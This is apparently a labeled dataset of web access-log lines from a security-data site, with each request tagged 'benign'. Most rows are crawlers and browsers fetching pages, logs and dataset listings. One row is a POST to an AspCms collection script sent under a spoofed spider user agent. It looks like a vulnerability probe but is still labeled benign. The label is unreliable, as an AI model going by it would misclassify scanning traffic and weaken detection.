+"HEAD / HTTP/1.1 STATUS=200 BYTES=388 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36; Dragonbot; http://www.dragonmetrics.com""",benign
+"GET /tg/tg_snort_full.7z HTTP/1.1 STATUS=200 BYTES=8847868 UA=""Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 UA=""Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)""",benign
+"GET /self.logs/error.log.2021-03-22 HTTP/1.1 STATUS=301 BYTES=535 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=206 BYTES=13234 UA=""Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Slackbot 1.0 (+https://api.slack.com/robots)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 REF=""http://66.33.221.139"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0""",benign
+"GET / HTTP/1.0 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10""",benign
+"GET / HTTP/1.0 STATUS=200 BYTES=49096 UA=""Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /misc/zeus_dga_domains.txt.zip HTTP/1.1 STATUS=304 BYTES=265 UA=""Java/1.6.0_24""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.0 STATUS=200 BYTES=340 UA=""Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/dns.html HTTP/1.1 STATUS=200 BYTES=1793 UA=""Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)""",benign
+"GET /Datasets Description/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=629 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/ HTTP/1.1 STATUS=200 BYTES=677 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=834 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=834 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=833 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=827 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/app_stats.html HTTP/1.1 STATUS=200 BYTES=1591 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/conn.html HTTP/1.1 STATUS=200 BYTES=2011 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dhcp.html HTTP/1.1 STATUS=200 BYTES=1733 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dns.html HTTP/1.1 STATUS=200 BYTES=1837 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dpd.html HTTP/1.1 STATUS=200 BYTES=1664 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/files.html HTTP/1.1 STATUS=200 BYTES=1918 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/ftp.html HTTP/1.1 STATUS=200 BYTES=1765 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/http.html HTTP/1.1 STATUS=200 BYTES=2034 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/irc.html HTTP/1.1 STATUS=200 BYTES=1781 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/loaded_scripts.html HTTP/1.1 STATUS=200 BYTES=1543 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/notice.html HTTP/1.1 STATUS=200 BYTES=2001 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/packet_filter.html HTTP/1.1 STATUS=200 BYTES=1725 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/ssl.html HTTP/1.1 STATUS=200 BYTES=1860 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/weird.html HTTP/1.1 STATUS=200 BYTES=1937 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=832 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=832 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=832 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=824 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/app_stats.html HTTP/1.1 STATUS=200 BYTES=1590 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/conn.html HTTP/1.1 STATUS=200 BYTES=2006 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/dhcp.html HTTP/1.1 STATUS=200 BYTES=1737 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/dns.html HTTP/1.1 STATUS=200 BYTES=1831 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/dpd.html HTTP/1.1 STATUS=200 BYTES=1655 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/files.html HTTP/1.1 STATUS=200 BYTES=1910 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/ftp.html HTTP/1.1 STATUS=200 BYTES=1738 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/http.html HTTP/1.1 STATUS=200 BYTES=2032 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/irc.html HTTP/1.1 STATUS=200 BYTES=1771 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/loaded_scripts.html HTTP/1.1 STATUS=200 BYTES=1543 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/notice.html HTTP/1.1 STATUS=200 BYTES=2006 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/packet_filter.html HTTP/1.1 STATUS=200 BYTES=1725 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/ssl.html HTTP/1.1 STATUS=200 BYTES=1860 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/weird.html HTTP/1.1 STATUS=200 BYTES=1935 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=823 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=823 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=822 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=818 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/app_stats.html HTTP/1.1 STATUS=200 BYTES=1591 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/conn.html HTTP/1.1 STATUS=200 BYTES=2009 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/dhcp.html HTTP/1.1 STATUS=200 BYTES=1740 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/dns.html HTTP/1.1 STATUS=200 BYTES=1830 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/dpd.html HTTP/1.1 STATUS=200 BYTES=1662 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/files.html HTTP/1.1 STATUS=200 BYTES=1910 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/http.html HTTP/1.1 STATUS=200 BYTES=2035 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/irc.html HTTP/1.1 STATUS=200 BYTES=1784 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/loaded_scripts.html HTTP/1.1 STATUS=200 BYTES=1543 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/notice.html HTTP/1.1 STATUS=200 BYTES=2002 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/packet_filter.html HTTP/1.1 STATUS=200 BYTES=1725 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/ssl.html HTTP/1.1 STATUS=200 BYTES=1874 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/weird.html HTTP/1.1 STATUS=200 BYTES=1931 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/N/A HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/signatures.html HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /data HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/2015/ HTTP/1.1 STATUS=200 BYTES=7621 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/2016/ HTTP/1.1 STATUS=200 BYTES=7860 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=32375 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=33677 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=33101 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=38322 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=439 UA=""Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 REF=""https://www.reddit.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"POST /plug/collect/AspCms_CollectFun.asp HTTP/1.1 STATUS=408 BYTES=391 REF=""http://misc.yahoo.com.cn/"" UA=""Mozilla/5.0+(compatible;+Baispider/2.0;++http://www.bai.com/search/spider.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.secrepo.com/"" UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.secrepo.com/"" UA=""-""",benign
+"GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1 STATUS=200 BYTES=386900 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en""",benign
+"GET /self.logs/access.log.2019-06-26.gz HTTP/1.1 STATUS=200 BYTES=35028 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/access.log.2020-11-12.gz HTTP/1.1 STATUS=200 BYTES=9953 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=32375 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27879 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7519 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=676 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"GET /self.logs/access.log.2021-10-16.gz HTTP/1.1 STATUS=200 BYTES=27817 UA=""python-requests/2.12.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""www.secrepo.com"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.0 Safari/537.36 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=391 UA=""Mozilla/5.0 (compatible; Linespider/1.1; +https://lin.ee/4dwXkTH)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13147 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13184 UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
